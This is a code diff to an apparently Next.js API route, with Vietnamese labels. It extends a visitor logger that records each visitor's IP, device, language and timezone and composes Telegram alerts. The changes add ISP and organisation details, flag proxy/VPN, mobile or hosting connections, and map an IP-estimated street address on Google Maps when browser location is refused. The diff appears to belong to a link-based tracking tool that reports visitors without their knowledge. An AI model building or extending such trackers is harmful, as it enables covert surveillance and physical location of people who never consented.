@@ -24,13 +24,31 @@ export async function POST(request: Request) {
     logData += `Nguồn: ${from || 'link'}\n`;
     logData += `Thiết bị: ${ua}\n`;
     logData += `Địa chỉ IP: ${finalIp}\n`;
-    logData += `Ngôn ngữ: ${language || 'N/A'}\n`;
-    logData += `Múi giờ: ${timezone || 'N/A'}\n`;
 
     let telegramMessage = `*🔔 Truy cập mới (${sourceText})!*\n\n`;
     telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}\`\n`;
     telegramMessage += `*Thiết bị:* \`${ua}\`\n`;
     telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
+    
+    // Always fetch and add IP info
+    const ipInfo = await getAddressFromIp(finalIp);
+    if (ipInfo.isp) {
+        const ispDetails = [ipInfo.isp, ipInfo.org, ipInfo.as].filter(Boolean).join(' - ');
+        logData += `ISP: ${ispDetails}\n`;
+        telegramMessage += `*ISP:* \`${ispDetails}\`\n`;
+    }
+    const ipFlags = [
+        ipInfo.mobile ? 'Mobile' : null,
+        ipInfo.proxy ? 'Proxy/VPN' : null,
+        ipInfo.hosting ? 'Hosting' : null,
+    ].filter(Boolean).join(', ');
+    if (ipFlags) {
+        logData += `Loại IP: ${ipFlags}\n`;
+        telegramMessage += `*Loại IP:* \`${ipFlags}\`\n`;
+    }
+
+    logData += `Ngôn ngữ: ${language || 'N/A'}\n`;
+    logData += `Múi giờ: ${timezone || 'N/A'}\n`;
     telegramMessage += `*Ngôn ngữ:* \`${language || 'N/A'}\`\n`;
     telegramMessage += `*Múi giờ:* \`${timezone || 'N/A'}\`\n`;
 
@@ -49,15 +67,14 @@ export async function POST(request: Request) {
       telegramMessage += `*Bản đồ:* [Mở Google Maps](${maps_link})\n`;
     } else {
       // Fallback to IP Geolocation
-      const { address, lat: ipLat, lon: ipLon } = await getAddressFromIp(finalIp);
-      const maps_link = (ipLat && ipLon) ? `https://www.google.com/maps?q=${ipLat},${ipLon}` : 'N/A';
+      const maps_link = (ipInfo.lat && ipInfo.lon) ? `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}` : 'N/A';
 
       logData += `Tọa độ: N/A (Bị từ chối)\n`;
       logData += `Độ chính xác: N/A\n`;
-      logData += `Địa chỉ: ${address} (Ước tính từ IP)\n`;
+      logData += `Địa chỉ: ${ipInfo.address} (Ước tính từ IP)\n`;
       logData += `Link Google Maps: ${maps_link}\n`;
 
-      telegramMessage += `*Vị trí (IP):* ${address}\n`;
+      telegramMessage += `*Vị trí (IP):* ${ipInfo.address}\n`;
       if (maps_link !== 'N/A') {
         telegramMessage += `*Bản đồ (Ước tính):* [Mở Google Maps](${maps_link})\n`;
       }
